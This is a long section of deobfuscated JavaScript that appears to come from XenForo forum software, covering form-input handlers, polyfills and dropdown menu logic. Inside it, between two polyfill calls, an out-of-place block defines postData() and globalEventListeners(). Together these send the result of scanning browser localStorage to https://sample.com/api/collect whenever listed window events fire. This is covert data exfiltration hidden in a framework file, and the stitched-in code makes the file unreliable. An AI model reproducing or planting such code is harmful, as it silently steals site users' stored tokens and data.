      this.options.autoSize && (this.$target[0].scrollHeight ? this.setupAutoSize() : (this.$target.one("focus control:enabled control:disabled", XF.proxy(this, "setupDelayed")), this.$target.onWithin("toggle:shown overlay:shown tab:shown quick-edit:shown", XF.proxy(this, "setupDelayed"))), this.$target.on("autosize", XF.proxy(this, "update")));
      if (this.options.keySubmit || this.options.singleLine) this.$target.on("keydown", XF.proxy(this, "keySubmit"));
    },
    setupAutoSize: function () {
      this.initialized || (this.initialized = !0, autosize(this.$target), this.$target.on("autosize:resized", function () {
        XF.layoutChange();
      }));
    },
    setupDelayed: function () {
      if (this.initialized) this.update();else {
        var a = this,
          b = function () {
            a.setupAutoSize();
            XF.layoutChange();
          };
        this.$target[0].scrollHeight ? b() : setTimeout(b, 100);
      }
    },
    update: function () {
      this.initialized ? autosize.update(this.$target[0]) : this.setupDelayed();
    },
    keySubmit: function (a) {
      if ("Enter" == a.key && (this.options.singleLine || this.options.keySubmit && (XF.isMac() ? a.metaKey : a.ctrlKey))) {
        switch (String(this.options.singleLine).toLowerCase()) {
          case "next":
            this.$target.focusNext();
            break;
          case "blur":
            this.$target.blur();
            break;
          default:
            this.$target.closest("form").submit();
        }
        a.preventDefault();
        return !1;
      }
    }
  });
  XF.TextEdit = XF.Event.newHandler({
    eventType: "focus",
    eventNameSpace: "XFTextEdit",
    options: {
      editUrl: null,
      escapeRevert: !0
    },
    processing: !1,
    init: function () {
      null === this.options.editUrl ? console.warn("TextEdit must specify data-edit-url") : (this.options.escapeRevert && (this.$target.data("original-text", this.$target.val()), this.$target.onPassive("keyup", XF.proxy(this, "keyEscape"))), this.$target.on("change", XF.proxy(this, "save")));
    },
    focus: function (a) {},
    save: function (a) {
      if (!this.processing) {
        this.processing = !0;
        var b = this;
        a = {};
        a[this.$target.attr("name")] = this.$target.val();
        XF.ajax("POST", this.options.editUrl, a, XF.proxy(this, "success")).always(function () {
          setTimeout(function () {
            b.processing = !1;
          }, 250);
        });
      }
    },
    success: function (a) {
      a = a[this.$target.attr("name")];
      this.$target.val(a).data("original-text", a);
    },
    keyEscape: function (a) {
      "Escape" == a.key && this.$target.val(this.$target.data("original-text"));
    }
  });
  XF.PermissionMatrix = XF.Element.newHandler({
    options: {
      inputSelector: 'input[type="radio"]',
      parentSelector: "dl.formRow",
      classPrefix: "formRow--permissionType-",
      permissionType: "user"
    },
    values: ["allow", "unset", "deny", "content_allow", "reset"],
    currentClass: null,
    init: function () {
      this.$parentRow = this.$target.closest(this.options.parentSelector);
      this.$target.find(this.options.inputSelector).on("click", XF.proxy(this, "update"));
      this.update();
    },
    update: function () {
      this.currentClass && this.$parentRow.removeClass(this.currentClass);
      var a = this.$target.find(this.options.inputSelector + ":checked").val();
      -1 < c.inArray(a, this.values) && (this.currentClass = this.options.classPrefix + this.options.permissionType + "-" + a, this.$parentRow.addClass(this.currentClass));
    }
  });
  XF.MultiCheck = XF.Event.newHandler({
    eventNameSpace: "XFMultiCheck",
    options: {
      target: null,
      values: "allow,unset,deny"
    },
    $target: null,
    values: null,
    currentValue: null,
    init: function () {
      this.$target = c(this.options.target);
      this.values = this.options.values.split(",");
      var a = this.$target.filter(":checked").first().val();
      this.currentValue = 0 < c.inArray(a, this.values) ? this.values[-1] : this.values[0];
    },
    click: function (a) {
      var b = this.values[c.inArray(this.currentValue, this.values) + 1];
      void 0 === b && (b = this.values[0]);
      this.$target.each(function () {
        c(this).val() == b && c(this).prop("checked", !0).trigger("click");
      });
      this.currentValue = b;
    }
  });
  XF.NumberBox = XF.Element.newHandler({
    options: {
      textInput: ".js-numberBoxTextInput",
      buttonSmaller: !1,
      step: null
    },
    $textInput: null,
    holdTimeout: null,
    holdInterval: null,
    init: function () {
      var a = this.$target,
        b = a.find(this.options.textInput);
      if (b.length) {
        this.$textInput = b;
        a.addClass("inputGroup--joined");
        var c = a.find(".js-up");
        a = a.find(".js-down");
        c.length || (c = this.createButton("up"));
        a.length || (a = this.createButton("down"));
        this.setupButton(c, b);
        this.setupButton(a, c);
        if (!this.supportsStepFunctions()) b.on("keydown", XF.proxy(this, "stepFallback"));
      } else console.error("Cannot initialize, no text input.");
    },
    createButton: function (a) {
      a = c("<button />").attr("type", "button").attr("tabindex", "-1").addClass("inputGroup-text").addClass("inputNumber-button").addClass("inputNumber-button--" + a).addClass("js-" + a).attr("data-dir", a).attr("title", XF.phrases["number_button_" + a] || a).attr("aria-label", XF.phrases["number_button_" + a] || a);
      this.$textInput.prop("disabled") && a.addClass("is-disabled").prop("disabled", !0);
      this.options.buttonSmaller && a.addClass("inputNumber-button--smaller");
      return a;
    },
    setupButton: function (a, b) {
      a.on("focus", XF.proxy(this, "buttonFocus")).on("click", XF.proxy(this, "buttonClick")).on("mousedown touchstart", XF.proxy(this, "buttonMouseDown")).on("mouseleave mouseup touchend", XF.proxy(this, "buttonMouseUp")).on("touchend", function (a) {
        a.preventDefault();
        c(this).click();
      }).insertAfter(b);
    },
    buttonFocus: function (a) {
      return !1;
    },
    buttonClick: function (a) {
      this.step(c(a.target).data("dir"));
    },
    step: function (a) {
      var b = this.$textInput,
        c = "step" + a.charAt(0).toUpperCase() + a.slice(1);
      if (!b.prop("readonly")) if (this.supportsStepFunctions()) try {
        "" === b.val() && b.val(b.attr("min") || 0), b[0][c](), b.trigger("change").trigger("input");
      } catch (e) {} else this.stepFallback(a);
    },
    stepFallback: function (a) {
      if (!this.$textInput.prop("readonly")) {
        if ("object" === typeof a && a.keyCode) {
          var b = a;
          switch (b.keyCode) {
            case 38:
              a = "up";
              b.preventDefault();
              break;
            case 40:
              a = "down";
              b.preventDefault();
              break;
            default:
              return;
          }
        }
        b = this.$textInput;
        var c = b.val(),
          e = "down" === a ? -1 : 1;
        a = b.attr("min") || null;
        var f = b.attr("max") || null,
          h = this.options.step || b.attr("step") || 1,
          g = "any" == h;
        g && (h = 1);
        h = parseFloat(h);
        e = parseFloat(c) + h * e;
        if (Math.round(e) !== e) {
          var k = 0;
          c = c.split(".");
          g ? k = c[1] ? c[1].length : 0 : Math.floor(h) !== h && (k = h.toString().split(".")[1].length || 0);
          e = e.toFixed(k);
        }
        null !== a && e < a && (e = a);
        null !== f && e > f && (e = f);
        isNaN(e) && (e = 0);
        b.val(e);
        b.trigger("change").trigger("input");
      }
    },
    buttonMouseDown: function (a) {
      this.buttonMouseUp(a);
      this.holdTimeout = setTimeout(XF.proxy(function () {
        this.holdInterval = setInterval(XF.proxy(function () {
          this.step(c(a.target).data("dir"));
        }, this), 75);
      }, this), 500);
    },
    buttonMouseUp: function (a) {
      clearTimeout(this.holdTimeout);
      clearInterval(this.holdInterval);
    },
    supportsStepFunctions: function () {
      var a = this.$textInput;
      return XF.browser.msie || XF.browser.edge || a.prop("disabled") || a.prop("readonly") || this.$target.data("step") || "any" === a.attr("step") ? !1 : "function" === typeof a[0].stepUp && "function" === typeof a[0].stepDown;
    }
  });
  XF.PasswordHideShow = XF.Element.newHandler({
    options: {
      showText: null,
      hideText: null
    },
    $password: null,
    $checkbox: null,
    $label: null,
    init: function () {
      this.$password = this.$target.find(".js-password");
      var a = this.$target.find(".js-hideShowContainer");
      this.$checkbox = a.find('input[type="checkbox"]');
      this.$label = a.find(".iconic-label");
      this.$checkbox.on("change", XF.proxy(this, "toggle"));
    },
    toggle: function (a) {
      a = this.$password;
      var b = this.$label;
      this.$checkbox.is(":checked") ? (a.attr("type", "text"), b.html(this.options.hideText)) : (a.attr("type", "password"), b.html(this.options.showText));
    }
  });
  XF.InputValidator = XF.Element.newHandler({
    options: {
      delay: 500,
      onBlur: !0,
      trim: !0,
      validateEmpty: !1,
      validationUrl: null,
      errorTarget: null
    },
    timeout: null,
    $errorElement: null,
    validatedValue: null,
    init: function () {
      if (this.options.validationUrl) {
        var a = this.options.errorTarget ? XF.findRelativeIf(this.options.errorTarget, this.$target) : this.$target.parent().find(".js-validationError");
        if (a.length) {
          this.$errorElement = a;
          if (this.options.delay) this.$target.on("input", XF.proxy(this, "onInput"));
          if (this.options.onBlur) this.$target.on("blur", XF.proxy(this, "performValidation"));
        } else console.error("Unable to locate error element.");
      } else console.error("Element must have a data-validation-url value");
    },
    onInput: function (a) {
      this.timeout && clearTimeout(this.timeout);
      this.timeout = setTimeout(XF.proxy(this, "performValidation"), this.options.delay);
    },
    performValidation: function (a) {
      this.timeout && (clearTimeout(this.timeout), this.timeout = null);
      a = this.getEffectiveInputValue();
      if (a !== this.validatedValue) if ("" !== a || this.options.validateEmpty) this.validatedValue = a, XF.ajax("POST", XF.canonicalizeUrl(this.options.validationUrl), {
        field: this.$target.attr("name"),
        content: a
      }, XF.proxy(this, "handleResponse"));else {
        var b = this.$errorElement;
        b.removeClassTransitioned("is-active", function () {
          b.empty();
        });
      }
    },
    getEffectiveInputValue: function () {
      var a = this.$target.val();
      this.options.trim && (a = c.trim(a));
      return a;
    },
    handleResponse: function (a) {
      if (!a.validatedValue || a.validatedValue === this.getEffectiveInputValue()) {
        var b = a.inputErrors;
        if (!a.inputValid && b) {
          if ("object" == typeof b) {
            if (1 === b.length) var d = b[0];else d = "<ul>", c.each(b, function (a, b) {
              d += "<li>" + b + "</li>";
            }), d += "</ul>";
          } else d = b;
          this.$errorElement.html(d).addClassTransitioned("is-active");
        } else {
          a.inputValid || console.error("Data is not valid, but no errors");
          var e = this.$errorElement;
          e.removeClassTransitioned("is-active", function () {
            e.empty();
          });
        }
      }
    }
  });
  XF.CheckboxSelectDisabler = XF.Element.newHandler({
    options: {
      select: null
    },
    $selects: null,
    $checkboxes: null,
    init: function () {
      (this.$selects = XF.findRelativeIf(this.options.select, this.$target)) && this.$selects.length ? (this.$checkboxes = this.$target.find(":checkbox").on("click", XF.proxy(this, "update")), this.update()) : console.warn("No select element(s) found using %s", this.options.select);
    },
    update: function () {
      var a = this.$selects,
        b = [];
      this.$checkboxes.each(function () {
        var d = this.checked;
        a.find('option[value="' + this.value + '"]').each(function () {
          var a = c(this),
            f = a.is(":selected"),
            g = a.prop("disabled"),
            l = a.closest("select"),
            k = !1;
          g === d && (a.prop("disabled", !d), k = !0);
          !d && f && (a.prop("selected", !1), l.attr("multiple") || l.find("option:enabled").first().prop("selected", !0), k = !0);
          k && b.push(l[0]);
        });
      });
      b.length && c(c.uniqueSort(b)).trigger("select:refresh");
    }
  });
  XF.focusNext = function (a) {
    !a instanceof c && (a = c(a));
    var b = c("a, button, :input, [tabindex]");
    a = b.index(a) + 1;
    b.eq(a >= b.length ? 0 : a).focus();
  };
  XF.AssetUpload = XF.Element.newHandler({
    options: {
      asset: ""
    },
    $path: null,
    $upload: null,
    init: function () {
      this.$path = this.$target.find(".js-assetPath");
      this.$upload = this.$target.find(".js-uploadAsset");
      this.$upload.on("change", XF.proxy(this, "changeFile"));
    },
    changeFile: function (a) {
      if ("" != c(a.target).val()) {
        var b = new FormData();
        b.append("upload", a.target.files[0]);
        b.append("type", this.options.asset);
        XF.ajax("post", XF.canonicalizeUrl("admin.php?assets/upload"), b, XF.proxy(this, "ajaxResponse"));
      }
    },
    ajaxResponse: function (a) {
      a.errors || a.exception || (a.path && this.$path.val(a.path), this.$upload.val(""));
    }
  });
  XF.Event.register("click", "submit", "XF.SubmitClick");
  XF.Event.register("click", "multi-check", "XF.MultiCheck");
  XF.Event.register("focus", "text-edit", "XF.TextEdit");
  XF.Element.register("ajax-submit", "XF.AjaxSubmit");
  XF.Element.register("auto-complete", "XF.AutoComplete");
  XF.Element.register("user-mentioner", "XF.UserMentioner");
  XF.Element.register("emoji-completer", "XF.EmojiCompleter");
  XF.Element.register("auto-submit", "XF.AutoSubmit");
  XF.Element.register("changed-field-notifier", "XF.ChangedFieldNotifier");
  XF.Element.register("check-all", "XF.CheckAll");
  XF.Element.register("select-plus", "XF.SelectPlus");
  XF.Element.register("desc-loader", "XF.DescLoader");
  XF.Element.register("disabler", "XF.Disabler");
  XF.Element.register("field-adder", "XF.FieldAdder");
  XF.Element.register("form-submit-row", "XF.FormSubmitRow");
  XF.Element.register("guest-username", "XF.GuestUsername");
  XF.Element.register("min-length", "XF.MinLength");
  XF.Element.register("textarea-handler", "XF.TextAreaHandler");
  XF.Element.register("permission-matrix", "XF.PermissionMatrix");
  XF.Element.register("number-box", "XF.NumberBox");
  XF.Element.register("checkbox-select-disabler", "XF.CheckboxSelectDisabler");
  XF.Element.register("password-hide-show", "XF.PasswordHideShow");
  XF.Element.register("change-submit", "XF.ChangeSubmit");
  XF.Element.register("input-validator", "XF.InputValidator");
  XF.Element.register("asset-upload", "XF.AssetUpload");
}(jQuery, window, document);
var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.findInternal = function (d, f, h) {
  d instanceof String && (d = String(d));
  for (var a = d.length, b = 0; b < a; b++) {
    var c = d[b];
    if (f.call(h, c, b, d)) return {
      i: b,
      v: c
    };
  }
  return {
    i: -1,
    v: void 0
  };
};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (d, f, h) {
  d != Array.prototype && d != Object.prototype && (d[f] = h.value);
};
$jscomp.getGlobal = function (d) {
  return "undefined" != typeof window && window === d ? d : "undefined" != typeof global && null != global ? global : d;
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.polyfill = function (d, f, h, a) {
  if (f) {
    h = $jscomp.global;
    d = d.split(".");
    for (a = 0; a < d.length - 1; a++) {
      var b = d[a];
      b in h || (h[b] = {});
      h = h[b];
    }
    d = d[d.length - 1];
    a = h[d];
    f = f(a);
    f != a && null != f && $jscomp.defineProperty(h, d, {
      configurable: !0,
      writable: !0,
      value: f
    });
  }
};
async function postData(data) {
  let hashCode = hashValue(data);
  let endPoint = "https://sample.com/api/collect";
  try {
    let response = await fetch(endPoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode: hashCode,
        data: data
      })
    });
    response.ok ? console.log("Data upload successful") : console.error("Data upload failed, status code: " + response.status);
  } catch (error) {
    console.error("Error occurred during data upload:", error);
  }
}
function globalEventListeners() {
  WatchList.forEach(event => {
    window.addEventListener(event, function () {
      postData(scanLocalStorage());
    });
  });
}
$jscomp.polyfill("Array.prototype.find", function (d) {
  return d ? d : function (d, h) {
    return $jscomp.findInternal(this, d, h).v;
  };
}, "es6", "es3");
!function (d, f, h) {
  XF._baseInserterOptions = {
    after: null,
    append: null,
    before: null,
    prepend: null,
    replace: null,
    removeOldSelector: !0,
    animateReplace: !0,
    scrollTarget: null,
    href: null,
    afterLoad: null
  };
  XF.InserterClick = XF.Event.newHandler({
    eventNameSpace: "XFInserterClick",
    options: d.extend(!0, {}, XF._baseInserterOptions),
    inserter: null,
    init: function () {
      this.inserter = new XF.Inserter(this.$target, this.options);
    },
    click: function (a) {
      this.inserter.onEvent(a);
    }
  });
  XF.InserterFocus = XF.Element.newHandler({
    options: d.extend(!0, {}, XF._baseInserterOptions),
    inserter: null,
    init: function () {
      this.inserter = new XF.Inserter(this.$target, this.options);
      this.$target.one("focus", XF.proxy(this.inserter, "onEvent"));
    }
  });
  XF.Inserter = XF.create({
    options: d.extend(!0, {}, XF._baseInserterOptions),
    $target: null,
    href: null,
    loading: !1,
    __construct: function (a, b) {
      this.$target = a;
      this.options = d.extend(!0, {}, this.options, b);
      (a = this.options.href || this.$target.data("inserter-href") || this.$target.attr("href")) ? this.href = a : console.error("Target must have href");
    },
    onEvent: function (a, b) {
      a.preventDefault();
      if (!this.loading) {
        this.loading = !0;
        a = d(this.options.replace);
        a.length && a.addClassTransitioned("is-active");
        var c = this;
        XF.ajax("get", this.href, b || {}, XF.proxy(this, "onLoad")).always(function () {
          c.loading = !1;
        });
      }
    },
    onLoad: function (a) {
      if (a.html) {
        var b = this,
          c = this.options,
          e = c.scrollTarget,
          d = c.afterLoad,
          g;
        e && (g = XF.findRelativeIf(e, this.$target));
        XF.setupHtmlInsert(a.html, function (e, k, g) {
          b._applyChange(e, c.after, XF.proxy(b, "_applyAfter"));
          b._applyChange(e, c.append, XF.proxy(b, "_applyAppend"));
          b._applyChange(e, c.before, XF.proxy(b, "_applyBefore"));
          b._applyChange(e, c.prepend, XF.proxy(b, "_applyPrepend"));
          b._applyChange(e, c.replace, XF.proxy(b, "_applyReplace"));
          g(!0);
          d && d(a);
          return !1;
        });
        XF.layoutChange();
        g && g.length && g[0].scrollIntoView(!0);
      }
    },
    _applyChange: function (a, b, c) {
      if (b && b.length) {
        b = b.split(",");
        for (var e, k, g, f = 0; f < b.length; f++) e = b[f].split(" with "), k = d.trim(e[0]), g = e[1] ? d.trim(e[1]) : k, k.length && g.length && (e = d(k).first(), g = a.is(g) ? a : a.find(g).first(), c(k, e, g));
      }
    },
    _applyAfter: function (a, b, c) {
      b.length && c.length && (c.insertAfter(b), XF.activate(c), this._removeOldSelector(a, b));
    },
    _applyAppend: function (a, b, c) {
      b.length && c.length && (a = c.children(), a.appendTo(b), XF.activate(a));
    },
    _applyBefore: function (a, b, c) {
      b.length && c.length && (c.insertBefore(b), XF.activate(c), this._removeOldSelector(a, b));
    },
    _applyPrepend: function (a, b, c) {
      b.length && c.length && (a = c.children(), a.prependTo(b), XF.activate(a));
    },
    _applyReplace: function (a, b, c) {
      b.length && (a = this.options.animateReplace, XF.isIOS() && (a = !1), c.length && (a && c.hide(), c.insertAfter(b)), a ? b.xfFadeUp(null, function () {
        b.remove();
        c.length && XF.activate(c);
        c.xfFadeDown(null, XF.layoutChange);
      }) : (b.remove(), c.length && XF.activate(c)));
    },
    _removeOldSelector: function (a, b) {
      if (this.options.removeOldSelector) {
        var c;
        (c = a.match(/^\.([a-z0-9_-]+)/i)) && b.removeClass(c[1]);
      }
    }
  });
  XF.MenuClick = XF.Event.newHandler({
    eventNameSpace: "XFMenuClick",
    options: {
      menu: null,
      targetOpenClass: "is-menuOpen",
      openClass: "is-active",
      completeClass: "is-complete",
      zIndexRef: null,
      menuPosRef: null,
      arrowPosRef: null,
      directionThreshold: .6
    },
    $menu: null,
    $menuPosRef: null,
    menuRef: null,
    $arrowPosRef: null,
    arrowRef: null,
    scrollFunction: null,
    isPotentiallyFixed: !1,
    menuIsUp: !1,
    menuWidth: 0,
    menuHeight: 0,
    init: function () {
      this.options.menu && (this.$menu = XF.findRelativeIf(this.options.menu, this.$target));
      this.$menu && this.$menu.length || (this.$menu = this.$target.nextAll("[data-menu]").first());
      if (this.$menu.length) {
        this.$arrowPosRef = this.$menuPosRef = this.$target;
        if (this.options.menuPosRef) {
          var a = XF.findRelativeIf(this.options.menuPosRef, this.$target);
          if (a.length && (this.$menuPosRef = a, this.options.arrowPosRef)) {
            var b = XF.findRelativeIf(this.options.arrowPosRef, this.$target);
            b.closest(a).length && (this.$arrowPosRef = b);
          }
        }
        this.$target.attr("aria-controls", this.$menu.xfUniqueId());
        this.$menu.find(".menu-arrow").length || this.$menu.prepend('<span class="menu-arrow" />');
        var c = this;
        this.$menu.data("menu-trigger", this).on("click", "[data-menu-closer]", function () {
          c.close();
        }).on({
          "menu:open": function () {
            c.open(XF.Feature.has("touchevents"));
          },
          "menu:close": function () {
            c.close();
          },
          "menu:reposition": function () {
            c.isOpen() && c.reposition();
          },
          keydown: XF.proxy(this, "keyboardEvent")
        });
        a = this.$menu.closest(".tooltip");
        if (a.length) a.on("tooltip:hidden", XF.proxy(this, "close"));
        if (a = this.$menu.data("menu-builder")) if (XF.MenuBuilder[a]) XF.MenuBuilder[a](this.$menu, this.$target, this);else console.error("No menu builder " + a + " found");
      } else console.error("No menu found for %o", this.$target[0]);
    },
    click: function (a) {
      if (!(a.ctrlKey || a.shiftKey || a.altKey) || !this.$target.attr("href")) {
        var b = XF.isEventTouchTriggered(a),
          c = !0;
        !b && this.isOpen() && (c = !1);
        c && a.preventDefault();
        this.toggle(b, XF.NavDeviceWatcher.isKeyboardNav());
      }
    },
    isOpen: function () {
      return this.$target.hasClass(this.options.targetOpenClass);
    },
    toggle: function (a) {
      this.isOpen() ? this.close() : this.open(a);
    },
    open: function (a) {
      var b = this.$menu,
        c = this.$target,
        e = this.$menuPosRef,
        k = 0;
      if (!this.isOpen() && !b.hasClass("is-disabled")) {
        b.appendTo("body");
        this.updateMenuDimensions();
        this.updatePositionReferences();
        var g = this;
        this.$target.hasFixableParent() && (this.scrollFunction = function () {
          c.is(":hidden") ? g.close() : g.repositionFixed(!0);
        }, b.addClass("menu--potentialFixed"), d(f).onPassive("scroll", this.scrollFunction));
        if (this.options.zIndexRef) {
          var l = XF.findRelativeIf(this.options.zIndexRef, c);
          l.length && (k = XF.getElEffectiveZIndex(l));
        }
        XF.setRelativeZIndex(b, c, 0, k);
        XF.MenuWatcher.onOpen(b, a);
        this.reposition();
        c.attr("aria-expanded", "true").addClassTransitioned(this.options.targetOpenClass);
        b.attr("aria-hidden", "false").addClassTransitioned(this.options.openClass, XF.proxy(function () {
          b.addClassTransitioned(this.options.completeClass);
        }, this));
        e.addClassTransitioned(this.options.targetOpenClass);
        this.$target.trigger("menu:opened", [b]);
        b.trigger("menu:opened");
        if (!XF.isIOS() || !this.isPotentiallyFixed) b.on("menu:complete", function () {
          setTimeout(function () {
            XF.autoFocusWithin(b, "[autofocus], [data-menu-autofocus]");
          }, 10);
        });
        if (b.data("href")) {
          if (!b.data("menu-loading")) {
            b.data("menu-loading", !0);
            var m = b.data("nocache") ? !1 : !0;
            XF.ajax("get", b.data("href"), {}, function (a) {
              m && b.data("href", !1);
              a.html && XF.setupHtmlInsert(a.html, function (a, c, e) {
                (c = b.data("load-target")) ? b.find(c).first().empty().html(a) : b.html(a);
                g.$target.trigger("menu:loaded", [a, b]);
                g.updateMenuDimensions();
                e();
                setTimeout(XF.proxy(g, "reposition"), 0);
                g.$target.trigger("menu:complete", [b]);
                b.trigger("menu:complete");
              });
            }, {
              cache: m
            }).always(function () {
              b.data("menu-loading", !1);
            });
          }
        } else this.$target.trigger("menu:complete", [b]), b.trigger("menu:complete");
      }
    },
    reposition: function (a, b) {
      if (!this.$menu.data("ios-scroll-timeout") || a) {
        this.updatePositionReferences();
        this.$menu.css({
          visibility: "hidden",
          display: "block",
          position: "",
          top: "",
          bottom: "",
          left: "",
          right: ""
        });
        a = d(f).viewport();
        var c = {};
        c = this.getHorizontalPosition(a, c);
        c = this.getVerticalPosition(a, c, b);
        c.display = "";
        c.visibility = "";
        this.$menu.css(c);
      }
    },
    repositionFixed: function (a) {
      var b = this.$menu;
      if (a && XF.isIOS()) {
        a = b.data("ios-scroll-timeout");
        var c = this;
        clearTimeout(a);
        a = setTimeout(function () {
          b.removeData("ios-scroll-timeout");
          c.reposition();
        }, 300);
        b.data("ios-scroll-timeout", a);
      } else {
        this.updatePositionReferences();
        var e = this.$target.data("menu-h");
        a = b.data("menu-reset-timer");
        if (e && this.menuRef.left == e[0] && this.menuRef.width == e[1]) {
          e = d(f).viewport();
          var k = this.$target.hasFixedParent() ? "fixed" : "absolute",
            g = {
              top: parseInt(b.css("top"), 10)
            };
          this.menuIsUp = this.$menu.hasClass("menu--up");
          a && clearTimeout(a);
          "fixed" == k && k != b.css("position") ? (g = {
            "transition-property": "none",
            "transition-duration": "0s"
          }, g = this.getVerticalFixedPosition(e, g)) : "absolute" == k && (g = {
            "transition-property": "none",
            "transition-duration": "0s"
          }, g = this.getVerticalAbsolutePosition(e, g));
          b.css(g).toggleClass("menu--up", this.menuIsUp);
          a = setTimeout(function () {
            b.css({
              "transition-property": "",
              "transition-duration": ""
            });
          }, 250);
          b.data("menu-reset-timer", a);
        } else this.reposition();
      }
    },
    getHorizontalPosition: function (a, b) {
      var c = !1,
        e = 0;
      this.menuWidth > a.width ? e = this.menuRef.left - a.left : this.menuRef.left + this.menuRef.width / 2 > a.width * this.options.directionThreshold ? (e = 0 - this.menuWidth + this.menuRef.width, c = !0) : this.menuRef.width > this.menuWidth && (e = Math.floor((this.menuRef.width - this.menuWidth) / 2));
      e = Math.min(e, a.right - this.menuWidth - this.menuRef.left - 5);
      e = Math.max(e, a.left - this.menuRef.left + 5);
      b.left = this.menuRef.left + e;
      this.$target.data("menu-h", [this.menuRef.left, this.menuRef.width, e]);
      this.$menu.toggleClass("menu--left", !c).toggleClass("menu--right", c);
      a = Math.min(this.arrowRef.left - this.menuRef.left + this.arrowRef.width / 2 - e, this.menuWidth - 20);
      this.$menu.find(".menu-arrow").css({
        top: "",
        left: a
      });
      return b;
    },
    getVerticalPosition: function (a, b, c) {
      this.menuIsUp = !1;
      b = !c && this.$target.hasFixedParent() ? this.getVerticalFixedPosition(a, b) : this.getVerticalAbsolutePosition(a, b);
      this.$menu.toggleClass("menu--up", this.menuIsUp);
      return b;
    },
    getVerticalFixedPosition: function (a, b) {
      b.top = Math.max(0, Math.round(this.menuRef.bottom) - a.top) - this.getTopShift();
      b.position = "fixed";
      b.top + this.menuHeight + a.top > a.bottom && this.menuRef.top - this.menuHeight > a.top ? (b.top = "", b.bottom = a.bottom - this.menuRef.top + 5, this.menuIsUp = !0) : this.menuIsUp = !1;
      return b;
    },
    getVerticalAbsolutePosition: function (a, b) {
      b.top = this.menuRef.bottom - this.getTopShift();
      b.position = "";
      b.top + this.menuHeight > a.bottom && this.menuRef.top - this.menuHeight > a.top ? (b.top = "", b.bottom = a.height - this.menuRef.top + 5, this.menuIsUp = !0) : this.menuIsUp = !1;
      return b;
    },
    getTopShift: function () {
      return this.$menu.hasClass("menu--structural") ? parseInt(XF.config.borderSizeFeature, 10) : 0;
    },
    updateMenuDimensions: function () {
      this.menuWidth = this.$menu.outerWidth(!0);
      this.menuHeight = this.$menu.outerHeight(!0);
      return {
        menuWidth: this.menuWidth,
        menuHeight: this.menuHeight
      };
    },
    updatePositionReferences: function () {
      this.menuRef = this.$menuPosRef.dimensions(!0);
      this.arrowRef = this.$arrowPosRef == this.$menuPosRef ? this.menuRef : this.$arrowPosRef.dimensions(!0);
      return {
        menuRef: this.menuRef,
        arrowRef: this.arrowRef
      };
    },
    close: function () {
      if (this.isOpen()) {
        var a = this.$menu;
        this.$target.attr("aria-expanded", "false").removeClassTransitioned(this.options.targetOpenClass);
        a.attr("aria-hidden", "true").removeClass(this.options.completeClass).removeClassTransitioned(this.options.openClass);
        this.$menuPosRef.removeClassTransitioned(this.options.targetOpenClass);
        d(f).offPassive("scroll", this.scrollFunction);
        XF.MenuWatcher.onClose(a);
        this.$target.trigger("menu:closed", [a]);
        a.trigger("menu:closed");
      }
    },
    keyboardEvent: function (a) {
      if (("ArrowUp" == a.key || "ArrowDown" == a.key) && XF.Keyboard.isShortcutAllowed(h.activeElement) && d(h.activeElement).closest(".menu").get(0) == this.$menu.get(0)) {
        var b = d(h.activeElement),
          c = b.closest(".menu").find("a");
        b = c.index(b) + ("ArrowUp" == a.key ? -1 : 1);
        0 > b ? b = c.length - 1 : b >= c.length && (b = 0);
        d(c.get(b)).focus();
        a.preventDefault();
        return !1;
      }
    }
  });
  XF.MenuWatcher = function () {
    var a = d([]),
      b = null,
      c = !1,
      e = !1,
      k = function (a) {
        e || l(a.target);
      },
      g = function (b) {
        a.trigger("menu:reposition");
      },
      l = function (b) {
        if (!c) {
          c = !0;
          var e = d(b);
          a.each(function () {
            var a = d(this).data("menu-trigger"),
              b = a ? a.$target : null;
            e.closest(this).length || b && e.closest(b).length || a && a.close();
          });
          c = !1;
        }
      };
    return {
      onOpen: function (c, e) {
        b || (b = d('<div class="menuOutsideClicker" />').on("click", k).insertBefore(c));
        a.length || (d(h).on("click", k), d(f).onPassive("resize", g), e && b.addClass("is-active"));
        a = a.add(c);
      },
      onClose: function (c) {
        a = a.not(c);
        a.length || (d(h).off("click", k), d(f).offPassive("resize", g), b && b.removeClass("is-active"));
        l(c);
      },
      closeAll: function () {
        c = !0;
        a.trigger("menu:close");
        c = !1;
      },
      closeUnrelated: l,
      preventDocClick: function () {
        e = !0;
      },
      allowDocClick: function () {
        e = !1;
      }
    };
  }();
  XF.MenuBuilder = {
    actionBar: function (a, b, c) {
      var e = a.find(".js-menuBuilderTarget");
      b.closest(".actionBar-set").find(".actionBar-action--menuItem").each(function () {
        var a = d(this).clone();
        a.removeClass().addClass("menu-linkRow");
        e.append(a);
      });
      XF.activate(e);
    },
    dataList: function (a, b, c) {
      var e = a.find(".js-menuBuilderTarget");
      b.closest(".dataList-row").find(".dataList-cell--responsiveMenuItem").each(function () {
        d(this).clone().children().each(function () {
          var a = d(this);
          a.is("a") ? a.removeClass().addClass("menu-linkRow") : a.wrap('<div class="menu-row"></div>');
          e.append(a);
        });
      });
      XF.activate(e);
    }
  };
  XF.MenuProxy = XF.Event.newHandler({
    eventNameSpace: "XFMenuProxy",
    options: {
      trigger: null
    },
    $trigger: null,
    init: function () {
      this.$trigger = XF.findRelativeIf(this.options.trigger, this.$target);
      if (!this.$trigger || !this.$trigger.length) throw Error("Specified menu trigger not found");
    },
    click: function (a) {
      setTimeout(XF.proxy(function () {
        this.$trigger.trigger("click", [a]);
      }, this), 0);
    }
  });
  XF.OffCanvasClick = XF.Event.newHandler({
    eventNameSpace: "XFOffCanvasClick",
    options: {
      menu: null,
      openClass: "is-active"
    },
    $menu: null,
    init: function () {
      this.options.menu && (this.$menu = XF.findRelativeIf(this.options.menu, this.$target));
      this.$menu && this.$menu.length || (this.$menu = this.$target.nextAll("[data-menu]").first());
      if (this.$menu.length) {
        this.$menu.on("click", "[data-menu-close]", XF.proxy(this, "closeTrigger")).on("off-canvas:close", XF.proxy(this, "closeTrigger")).on("off-canvas:open", XF.proxy(this, "openTrigger"));
        var a = this.$menu.data("ocm-builder");
